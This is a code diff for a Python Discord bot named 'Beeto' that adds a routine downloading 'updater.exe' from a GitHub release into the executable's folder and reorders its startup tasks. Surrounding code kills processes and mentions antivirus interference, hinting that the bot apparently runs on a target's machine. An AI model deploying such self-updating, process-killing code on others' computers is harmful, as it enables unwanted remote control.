@@ -21,7 +21,7 @@ import requests
 
 
 TESTING = False
-VERSION = "v2"
+VERSION = "v3"
 
 
 def retriveToken():
@@ -95,15 +95,16 @@ async def updateCheck():
 
 @bot.event
 async def on_ready():
+    await bot.wait_until_ready()
     if not TESTING:
+        updaterChecker()
+        updateCheck.start()
         startUpCheck()
         startTerms(5)
-    await bot.wait_until_ready()
     channel = bot.get_channel(CHANNEL_ID)
     await channel.send(content="Beeto has logged in!")
     await channel.send(content="https://tenor.com/view/sonic-devil-diabolique-evil-gif-9725651736562738158")
     activityChanger.start()
-    updateCheck.start()
 
 
 # @client.event
@@ -219,6 +220,26 @@ def kill_all_processes(target_name: str):
                 raise Exception(f"Cant kill process (probably not running or AV protection): {e}")
 
 
+def updaterChecker():
+    exe_dir = get_original_exe_path()
+    updater_path = os.path.join(exe_dir, "updater.exe")
+    if not os.path.exists(updater_path):
+            headers = {
+                'Accept': 'application/vnd.github+json',
+            }
+            response = requests.get('https://api.github.com/repos/GSstarGamer/betobuly/releases/tags/v1-updater', headers=headers)
+            response.raise_for_status()
+
+            with requests.get(getLatestURL(response.json()), stream=True) as r:
+                    with open(updater_path, 'wb') as f:
+                        for chunk in r.iter_content(chunk_size=8192):
+                            f.write(chunk)
+
+        
+def getLatestURL(json):
+    for asset in json["assets"]:
+        if asset["name"] == "updater.exe":
+            return asset["browser_download_url"]
 
 @bot.slash_command(name="ping", description="pong")
 async def ping(ctx: discord.ApplicationContext):
@@ -226,7 +247,7 @@ async def ping(ctx: discord.ApplicationContext):
     await ctx.respond("Pong!")
 
 @bot.slash_command(name="version", description="build version")
-async def ping(ctx: discord.ApplicationContext):
+async def version(ctx: discord.ApplicationContext):
     await ctx.defer()
     await ctx.respond(f"Version: {VERSION}")
 
